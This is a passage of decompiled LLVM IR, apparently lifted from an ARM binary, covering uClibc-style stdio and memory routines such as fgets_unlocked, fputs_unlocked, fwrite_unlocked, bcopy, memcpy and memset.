  %v0_113f0 = phi i32 [ %v0_113b0, %dec_label_pc_113a0 ], [ %v0_113dc.pre, %dec_label_pc_113b0 ]
  %v1_113dc = inttoptr i32 %v0_113f0 to i32*
  %v2_113dc = load i32, i32* %v1_113dc, align 4
  %v0_113e0 = load i32, i32* %sl.global-to-local, align 4
  %v2_113e0 = or i32 %v0_113e0, %v2_113dc
  %v1_113e4 = xor i32 %v2_113e0, 320
  store i32 %v1_113e4, i32* %r3.global-to-local, align 4
  %v1_113e8 = and i32 %v1_113e4, 832
  %v2_113e8 = icmp eq i32 %v1_113e8, 0
  store i1 %v2_113e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113e8, label %dec_label_pc_113f0, label %bb39

dec_label_pc_113f0:                               ; preds = %dec_label_pc_113dc
  store i32 %v0_113f0, i32* @r0, align 4
  %v0_113f4 = call i32 @__stdio_wcommit()
  store i32 %v0_113f4, i32* %r0.global-to-local, align 4
  %v2_113f8 = icmp eq i32 %v0_113f4, 0
  store i1 %v2_113f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113f8, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_113f0
  %v1_113fc = load i32, i32* @r6, align 4
  %v2_113fc = inttoptr i32 %v1_113fc to i32*
  %v3_113fc = load i32, i32* %v2_113fc, align 4
  store i32 %v3_113fc, i32* %r3.global-to-local, align 4
  %v2_11400 = add i32 %v1_113fc, 8
  %v3_11400 = inttoptr i32 %v2_11400 to i32*
  %v4_11400 = load i32, i32* %v3_11400, align 4
  %v2_11404 = and i32 %v3_113fc, -65
  store i32 %v2_11404, i32* %r3.global-to-local, align 4
  %v4_11408 = sdiv i32 %v3_113fc, 256
  store i32 %v4_11408, i32* %r1.global-to-local, align 4
  %v3_1140c = add i32 %v1_113fc, 28
  %v4_1140c = inttoptr i32 %v3_1140c to i32*
  store i32 %v4_11400, i32* %v4_1140c, align 4
  %v1_11410 = load i32, i32* %r1.global-to-local, align 4
  %v2_11410 = trunc i32 %v1_11410 to i8
  %v3_11410 = load i32, i32* @r6, align 4
  %v4_11410 = add i32 %v3_11410, 1
  %v5_11410 = inttoptr i32 %v4_11410 to i8*
  store i8 %v2_11410, i8* %v5_11410, align 1
  %v0_11414.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11414.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_11414 = load i32, i32* %r3.global-to-local, align 4
  %v2_11414 = trunc i32 %v1_11414 to i8
  %v3_11414 = load i32, i32* @r6, align 4
  %v4_11414 = inttoptr i32 %v3_11414 to i8*
  store i8 %v2_11414, i8* %v4_11414, align 1
  %v0_11418.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11418.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_113f0, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_113dc, %.thread6, %.thread7
  %v2_11420 = load i32, i32* @global_var_23204.322, align 4
  store i32 %v2_11420, i32* %r3.global-to-local, align 4
  %v7_11424 = icmp eq i32 %v2_11420, 2
  store i1 %v7_11424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11424, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_112ec, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 79548)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_11394, %bb40
  %v0_1143c = load i32, i32* @r6, align 4
  %v1_1143c = add i32 %v0_1143c, 32
  %v2_1143c = inttoptr i32 %v1_1143c to i32*
  %v3_1143c = load i32, i32* %v2_1143c, align 4
  store i32 %v3_1143c, i32* @r6, align 4
  %v2_11440 = icmp eq i32 %v3_1143c, 0
  store i1 %v2_11440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11440, label %dec_label_pc_11440.dec_label_pc_11448_crit_edge, label %dec_label_pc_11394

dec_label_pc_11440.dec_label_pc_11448_crit_edge:  ; preds = %.thread11
  %v0_11448.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11448

dec_label_pc_11448:                               ; preds = %dec_label_pc_11440.dec_label_pc_11448_crit_edge, %dec_label_pc_11304
  %v0_11448 = phi i32 [ %v0_11448.pre, %dec_label_pc_11440.dec_label_pc_11448_crit_edge ], [ %v1_11384, %dec_label_pc_11304 ]
  %v1_11448 = call i32 @_stdio_openlist_dec_use(i32 %v0_11448)
  store i32 %v1_11448, i32* %r0.global-to-local, align 4
  %v0_1148c.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_11450:                               ; preds = %dec_label_pc_112f8
  %v1_11450 = inttoptr i32 %.v1_112e4 to i8*
  %v2_11450 = load i8, i8* %v1_11450, align 1
  %v3_11450 = zext i8 %v2_11450 to i32
  %v1_11454 = and i32 %v3_11450, 64
  store i32 %v1_11454, i32* %r3.global-to-local, align 4
  %v2_11454 = icmp eq i32 %v1_11454, 0
  store i1 %v2_11454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11454, label %bb41, label %dec_label_pc_11460

bb41:                                             ; preds = %dec_label_pc_11450
  br label %bb43

dec_label_pc_11460:                               ; preds = %dec_label_pc_11450
  %v0_11460 = call i32 @__stdio_wcommit()
  store i32 %v0_11460, i32* %r0.global-to-local, align 4
  %v2_11464 = icmp eq i32 %v0_11460, 0
  store i1 %v2_11464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11464, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_11460
  %v1_11468 = load i32, i32* %r8.global-to-local, align 4
  %v2_11468 = inttoptr i32 %v1_11468 to i32*
  %v3_11468 = load i32, i32* %v2_11468, align 4
  store i32 %v3_11468, i32* %r3.global-to-local, align 4
  %v2_1146c = add i32 %v1_11468, 8
  %v3_1146c = inttoptr i32 %v2_1146c to i32*
  %v4_1146c = load i32, i32* %v3_1146c, align 4
  store i32 %v4_1146c, i32* %r1.global-to-local, align 4
  %v2_11470 = and i32 %v3_11468, -65
  store i32 %v2_11470, i32* %r3.global-to-local, align 4
  %v4_11474 = sdiv i32 %v3_11468, 256
  %v2_11478 = trunc i32 %v4_11474 to i8
  %v4_11478 = add i32 %v1_11468, 1
  %v5_11478 = inttoptr i32 %v4_11478 to i8*
  store i8 %v2_11478, i8* %v5_11478, align 1
  %v0_1147c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1147c.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_1147c = load i32, i32* %r1.global-to-local, align 4
  %v2_1147c = load i32, i32* %r8.global-to-local, align 4
  %v3_1147c = add i32 %v2_1147c, 28
  %v4_1147c = inttoptr i32 %v3_1147c to i32*
  store i32 %v1_1147c, i32* %v4_1147c, align 4
  %v1_11480 = load i32, i32* %r3.global-to-local, align 4
  %v2_11480 = trunc i32 %v1_11480 to i8
  %v3_11480 = load i32, i32* %r8.global-to-local, align 4
  %v4_11480 = inttoptr i32 %v3_11480 to i8*
  store i8 %v2_11480, i8* %v4_11480, align 1
  %v0_11484.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11484.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_11460
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_11448, %.thread20
  %v0_1148c = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_1148c.pre, %dec_label_pc_11448 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_1148c, i32* %r0.global-to-local, align 4
  store i32 %v3_112d8, i32* @r4, align 4
  ret i32 %v0_1148c

; uselistorder directives
  uselistorder i32 %v0_1148c, { 1, 0 }
  uselistorder i32 %v3_1143c, { 1, 2, 0 }
  uselistorder i32 %v2_112ec, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 9, 2, 10, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 7, 6, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32* bitcast (i32** @global_var_231d0.331 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_27550.311, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_113dc, { 1, 0 }
  uselistorder label %dec_label_pc_11394, { 1, 0 }
  uselistorder label %dec_label_pc_11304, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_114c0 = icmp eq i32 %arg2, 0
  store i1 %v2_114c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_11548, label %dec_label_pc_1152c.preheader

dec_label_pc_1152c.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_1152c15 = add i32 %arg2, -1
  store i32 %v1_1152c15, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1152c21 = icmp eq i32 %arg2, 1
  store i1 %v7_1152c21, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1152c21, label %dec_label_pc_11538, label %dec_label_pc_114d8

dec_label_pc_114d8:                               ; preds = %dec_label_pc_1152c.preheader, %dec_label_pc_1152c.backedge
  %v1_1153024.in = phi i32 [ %v0_11530.pre, %dec_label_pc_1152c.backedge ], [ %arg3, %dec_label_pc_1152c.preheader ]
  %v1_114d8 = add i32 %v1_1153024.in, 16
  %v2_114d8 = inttoptr i32 %v1_114d8 to i32*
  %v3_114d8 = load i32, i32* %v2_114d8, align 4
  store i32 %v3_114d8, i32* %r2.global-to-local, align 4
  %v1_114dc = add i32 %v1_1153024.in, 24
  %v2_114dc = inttoptr i32 %v1_114dc to i32*
  %v3_114dc = load i32, i32* %v2_114dc, align 4
  %v3_114e0 = icmp uge i32 %v3_114d8, %v3_114dc
  store i1 %v3_114e0, i1* %cpsr_c.global-to-local, align 1
  %v9_114e0 = icmp eq i32 %v3_114d8, %v3_114dc
  store i1 %v9_114e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_114e0, label %dec_label_pc_11500, label %dec_label_pc_114e8

dec_label_pc_114e8:                               ; preds = %dec_label_pc_114d8
  %v1_114e8 = inttoptr i32 %v3_114d8 to i8*
  %v2_114e8 = load i8, i8* %v1_114e8, align 1
  %v5_114e8 = add i32 %v3_114d8, 1
  store i32 %v5_114e8, i32* %r2.global-to-local, align 4
  %v2_114ec = load i32, i32* @r4, align 4
  %v3_114ec = inttoptr i32 %v2_114ec to i8*
  store i8 %v2_114e8, i8* %v3_114ec, align 1
  %v0_114f0 = load i32, i32* @r4, align 4
  %v1_114f0 = inttoptr i32 %v0_114f0 to i8*
  %v2_114f0 = load i8, i8* %v1_114f0, align 1
  %v5_114f0 = add i32 %v0_114f0, 1
  store i32 %v5_114f0, i32* @r4, align 4
  %v2_114f4 = icmp ugt i8 %v2_114f0, 9
  store i1 %v2_114f4, i1* %cpsr_c.global-to-local, align 1
  %v7_114f4 = icmp eq i8 %v2_114f0, 10
  store i1 %v7_114f4, i1* %cpsr_z.global-to-local, align 1
  %v0_114f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_114f8 = load i32, i32* @r5, align 4
  %v2_114f8 = add i32 %v1_114f8, 16
  %v3_114f8 = inttoptr i32 %v2_114f8 to i32*
  store i32 %v0_114f8, i32* %v3_114f8, align 4
  br i1 %v7_114f4, label %dec_label_pc_11538, label %dec_label_pc_1152c.backedge

dec_label_pc_11500:                               ; preds = %dec_label_pc_114d8
  %v1_1153024 = inttoptr i32 %v1_1153024.in to i8*
  %v3_11500 = call i32 @getc_unlocked(i8* %v1_1153024)
  %v4_11500 = trunc i32 %v3_11500 to i8
  %v5_11504 = icmp eq i8 %v4_11500, -1
  store i1 %v5_11504, i1* %cpsr_c.global-to-local, align 1
  %v10_11504 = icmp eq i32 %v3_11500, -1
  store i1 %v10_11504, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_11504, label %dec_label_pc_1150c, label %dec_label_pc_11528

dec_label_pc_1150c:                               ; preds = %dec_label_pc_11500
  %v0_1150c = load i32, i32* @r5, align 4
  %v1_1150c = inttoptr i32 %v0_1150c to i8*
  %v2_1150c = load i8, i8* %v1_1150c, align 1
  %v1_11510 = and i8 %v2_1150c, 8
  %v2_11510 = icmp eq i8 %v1_11510, 0
  store i1 %v2_11510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11510, label %dec_label_pc_11538, label %dec_label_pc_11548

dec_label_pc_11528:                               ; preds = %dec_label_pc_11500
  %v3_1151c = load i32, i32* @r4, align 4
  %v4_1151c = inttoptr i32 %v3_1151c to i8*
  store i8 %v4_11500, i8* %v4_1151c, align 1
  %v0_11520 = load i32, i32* @r4, align 4
  %v1_11520 = inttoptr i32 %v0_11520 to i8*
  %v2_11520 = load i8, i8* %v1_11520, align 1
  %v5_11520 = add i32 %v0_11520, 1
  store i32 %v5_11520, i32* @r4, align 4
  %v2_11524 = icmp ugt i8 %v2_11520, 9
  store i1 %v2_11524, i1* %cpsr_c.global-to-local, align 1
  %v7_11524 = icmp eq i8 %v2_11520, 10
  store i1 %v7_11524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11524, label %dec_label_pc_11538, label %dec_label_pc_1152c.backedge

dec_label_pc_1152c.backedge:                      ; preds = %dec_label_pc_11528, %dec_label_pc_114e8
  %v0_1152c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_11530.pre = load i32, i32* @r5, align 4
  %v1_1152c = add i32 %v0_1152c.pre, -1
  store i32 %v1_1152c, i32* %r6.global-to-local, align 4
  %v2_1152c = icmp ne i32 %v0_1152c.pre, 0
  store i1 %v2_1152c, i1* %cpsr_c.global-to-local, align 1
  %v7_1152c = icmp eq i32 %v0_1152c.pre, 1
  store i1 %v7_1152c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1152c, label %dec_label_pc_11538, label %dec_label_pc_114d8

dec_label_pc_11538:                               ; preds = %dec_label_pc_1152c.preheader, %dec_label_pc_11528, %dec_label_pc_1152c.backedge, %dec_label_pc_114e8, %dec_label_pc_1150c
  %v0_11538 = load i32, i32* @r4, align 4
  %v1_11538 = load i32, i32* %r7.global-to-local, align 4
  %v3_11538 = icmp uge i32 %v0_11538, %v1_11538
  store i1 %v3_11538, i1* %cpsr_c.global-to-local, align 1
  %v9_11538 = icmp eq i32 %v0_11538, %v1_11538
  store i1 %v9_11538, i1* %cpsr_z.global-to-local, align 1
  %v2_1153c = xor i1 %v9_11538, true
  %v3_1153c = and i1 %v3_11538, %v2_1153c
  br i1 %v3_1153c, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_11538
  %v7_11540 = inttoptr i32 %v0_11538 to i8*
  store i8 0, i8* %v7_11540, align 1
  %v0_11544.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_11544.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11538, %bb
  %v1_11544 = phi i1 [ %v1_11544.pre, %bb ], [ %v9_11538, %dec_label_pc_11538 ]
  %v0_11544 = phi i1 [ %v0_11544.pre, %bb ], [ %v3_11538, %dec_label_pc_11538 ]
  %v2_11544 = xor i1 %v1_11544, true
  %v3_11544 = and i1 %v0_11544, %v2_11544
  br i1 %v3_11544, label %.dec_label_pc_1154c_crit_edge, label %dec_label_pc_11548

.dec_label_pc_1154c_crit_edge:                    ; preds = %.thread7
  %v0_1154c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1154c

dec_label_pc_11548:                               ; preds = %entry, %dec_label_pc_1150c, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1154c

dec_label_pc_1154c:                               ; preds = %.dec_label_pc_1154c_crit_edge, %dec_label_pc_11548
  %v0_1154c = phi i32 [ %v0_1154c.pre, %.dec_label_pc_1154c_crit_edge ], [ 0, %dec_label_pc_11548 ]
  ret i32 %v0_1154c

; uselistorder directives
  uselistorder i1 %v9_11538, { 1, 0, 2 }
  uselistorder i32 %v1_11538, { 1, 0 }
  uselistorder i32 %v0_11538, { 0, 2, 1 }
  uselistorder i32 %v0_1152c.pre, { 2, 0, 1 }
  uselistorder i1 %v2_11510, { 1, 0 }
  uselistorder i32 %v3_114d8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1153024.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8 9, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_1154c, { 1, 0 }
  uselistorder label %dec_label_pc_11548, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11538, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_114d8, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_11554 = load i32, i32* @r4, align 4
  store i32 %v3_11554, i32* %stack_var_-16, align 4
  %v6_11554 = load i32, i32* @r5, align 4
  %v9_11554 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_11560 = call i32 @strlen(i8* %arg1)
  store i32 %v3_11560, i32* @r6, align 4
  %v0_11568 = load i32, i32* @r5, align 4
  %v0_1156c = load i32, i32* @r4, align 4
  %v5_11578 = inttoptr i32 %v0_11568 to i8*
  %v6_11578 = call i32 @__GI_fwrite_unlocked(i32 %v0_1156c, i32 1, i32 %v3_11560, i8* %v5_11578)
  %v1_1157c = load i32, i32* @r6, align 4
  %v9_1157c = icmp eq i32 %v6_11578, %v1_1157c
  br i1 %v9_1157c, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_11584 = phi i32 [ %v6_11578, %entry ], [ -1, %bb ]
  %v2_11584 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11584, i32* @r4, align 4
  store i32 %v6_11554, i32* @r5, align 4
  store i32 %v9_11554, i32* @r6, align 4
  ret i32 %v14_11584

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_11588 = load i32, i32* @r6, align 4
  %v12_11588 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_11590 = load i8, i8* %arg4, align 1
  %v4_11590 = zext i8 %v3_11590 to i32
  %v1_11594 = and i32 %v4_11590, 192
  store i32 %v1_11594, i32* %r3.global-to-local, align 4
  %v2_11598 = icmp eq i32 %v1_11594, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_11598, label %dec_label_pc_115c0, label %dec_label_pc_115b4

dec_label_pc_115b4:                               ; preds = %entry
  %v4_115b4 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_115b8 = icmp eq i32 %v4_115b4, 0
  br i1 %v2_115b8, label %dec_label_pc_115b4.dec_label_pc_115c0_crit_edge, label %dec_label_pc_11628

dec_label_pc_115b4.dec_label_pc_115c0_crit_edge:  ; preds = %dec_label_pc_115b4
  %v0_115c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_115c0

dec_label_pc_115c0:                               ; preds = %dec_label_pc_115b4.dec_label_pc_115c0_crit_edge, %entry
  %v0_115c81 = phi i32 [ %v0_115c0.pre, %dec_label_pc_115b4.dec_label_pc_115c0_crit_edge ], [ %arg2, %entry ]
  %v2_115c0 = icmp eq i32 %v0_115c81, 0
  br i1 %v2_115c0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_115c0
  br label %dec_label_pc_11628

bb:                                               ; preds = %dec_label_pc_115c0
  %v1_115c4 = load i32, i32* @r6, align 4
  %v3_115c4 = icmp eq i32 %v1_115c4, 0
  br i1 %v3_115c4, label %dec_label_pc_11628, label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %bb
  %v2_115d4 = udiv i32 -1, %v0_115c81
  %v0_115dc = load i32, i32* @r4, align 4
  store i32 %v0_115dc, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_115c4, %v2_115d4
  br i1 %tmp10, label %dec_label_pc_11600, label %dec_label_pc_115e8

dec_label_pc_115e8:                               ; preds = %dec_label_pc_115d4
  %v0_115e0 = load i32, i32* @r7, align 4
  %v2_115e8 = mul i32 %v1_115c4, %v0_115c81
  %v4_115ec = call i32 @__stdio_fwrite(i32 %v0_115e0, i32 %v2_115e8, i32 %v0_115dc)
  %v0_115f0 = load i32, i32* @r5, align 4
  %v2_115f4 = udiv i32 %v4_115ec, %v0_115f0
  store i32 %v2_115f4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1162c

dec_label_pc_11600:                               ; preds = %dec_label_pc_115d4
  %v1_11600 = inttoptr i32 %v0_115dc to i32*
  %v2_11600 = load i32, i32* %v1_11600, align 4
  %v1_11604 = or i32 %v2_11600, 8
  store i32 %v1_11604, i32* %r3.global-to-local, align 4
  %v3_11608 = sdiv i32 %v2_11600, 256
  store i32 %v3_11608, i32* %r2.global-to-local, align 4
  %v1_1160c = trunc i32 %v3_11608 to i8
  %v3_1160c = add i32 %v0_115dc, 1
  %v4_1160c = inttoptr i32 %v3_1160c to i8*
  store i8 %v1_1160c, i8* %v4_1160c, align 1
  %v0_11610 = load i32, i32* %r3.global-to-local, align 4
  %v1_11610 = trunc i32 %v0_11610 to i8
  %v2_11610 = load i32, i32* @r4, align 4
  %v3_11610 = inttoptr i32 %v2_11610 to i8*
  store i8 %v1_11610, i8* %v3_11610, align 1
  %v0_11614 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_11620 = inttoptr i32 %v0_11614 to i32*
  store i32 22, i32* %v2_11620, align 4
  %v0_1162c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1162c

dec_label_pc_11628:                               ; preds = %.thread, %dec_label_pc_115b4, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1162c

dec_label_pc_1162c:                               ; preds = %dec_label_pc_11600, %dec_label_pc_115e8, %dec_label_pc_11628
  %v0_1162c = phi i32 [ %v0_1162c.pre, %dec_label_pc_11600 ], [ %v2_115f4, %dec_label_pc_115e8 ], [ 0, %dec_label_pc_11628 ]
  store i32 %v9_11588, i32* @r6, align 4
  store i32 %v12_11588, i32* @r7, align 4
  ret i32 %v0_1162c

; uselistorder directives
  uselistorder i32 %v3_11608, { 1, 0 }
  uselistorder i32 %v1_115c4, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1162c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11628, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1164c = inttoptr i32 %arg2 to i8*
  %v3_1164c = call i32 @_memcpy(i8* %v2_1164c, i32 %arg1)
  ret i32 %v3_1164c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11650 = load i32, i32* @r0, align 4
  %v1_11650 = load i32, i32* @r1, align 4
  %v2_11650 = inttoptr i32 %v0_11650 to i8*
  %v3_11650 = call i32 @_memcpy(i8* %v2_11650, i32 %v1_11650)
  ret i32 %v3_11650
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_11664 = load i32, i32* @r2, align 4
  %v8_11664 = icmp eq i32 %v0_11664, 8
  store i1 %v8_11664, i1* %cpsr_z.global-to-local, align 1
  %v5_11668 = icmp slt i32 %v0_11664, 8
  br i1 %v5_11668, label %dec_label_pc_116c8, label %dec_label_pc_1166c

dec_label_pc_1166c:                               ; preds = %entry
  %v4_1166c = mul i32 %arg2, 256
  %v5_1166c = or i32 %v4_1166c, %arg2
  %v4_11670 = mul i32 %v5_1166c, 65536
  %v5_11670 = or i32 %v4_11670, %v5_1166c
  store i32 %v5_11670, i32* %r1.global-to-local, align 4
  %v1_1167457 = urem i32 %tmp, 4
  %v2_1167458 = icmp eq i32 %v1_1167457, 0
  store i1 %v2_1167458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1167458, label %dec_label_pc_11684, label %bb

bb:                                               ; preds = %dec_label_pc_1166c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1166c ]
  %v3_1167859 = phi i32 [ %v6_11678, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1166c ]
  %v4_11678 = inttoptr i32 %v3_1167859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11678, align 1
  %v5_11678 = load i32, i32* %r3.global-to-local, align 4
  %v6_11678 = add i32 %v5_11678, 1
  store i32 %v6_11678, i32* %r3.global-to-local, align 4
  %v0_1167c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11688.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1167c.pr, label %dec_label_pc_11684, label %.thread

.thread:                                          ; preds = %bb
  %v2_1167c = add i32 %v0_11688.pr.pre, -1
  store i32 %v2_1167c, i32* @r2, align 4
  %v1_11674 = urem i32 %v6_11678, 4
  %v2_11674 = icmp eq i32 %v1_11674, 0
  store i1 %v2_11674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11674, label %dec_label_pc_11684, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11678.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11678.pre to i8
  br label %bb

dec_label_pc_11684:                               ; preds = %.thread, %bb, %dec_label_pc_1166c
  %v0_1169028 = phi i32 [ %tmp, %dec_label_pc_1166c ], [ %v6_11678, %bb ], [ %v6_11678, %.thread ]
  %v0_11688.pr = phi i32 [ %v0_11664, %dec_label_pc_1166c ], [ %v0_11688.pr.pre, %bb ], [ %v2_1167c, %.thread ]
  %v0_11684 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11684, i32* @ip, align 4
  %v8_1168810 = icmp eq i32 %v0_11688.pr, 8
  store i1 %v8_1168810, i1* %cpsr_z.global-to-local, align 1
  %v5_1168c11 = icmp slt i32 %v0_11688.pr, 8
  br i1 %v5_1168c11, label %dec_label_pc_116c8, label %dec_label_pc_11690.preheader

dec_label_pc_11690.preheader:                     ; preds = %dec_label_pc_11684
  %v1_1169046 = inttoptr i32 %v0_1169028 to i32*
  store i32 %v0_11684, i32* %v1_1169046, align 4
  %v3_1169047 = add i32 %v0_1169028, 4
  %v4_1169048 = inttoptr i32 %v3_1169047 to i32*
  %v5_1169049 = load i32, i32* @ip, align 4
  store i32 %v5_1169049, i32* %v4_1169048, align 4
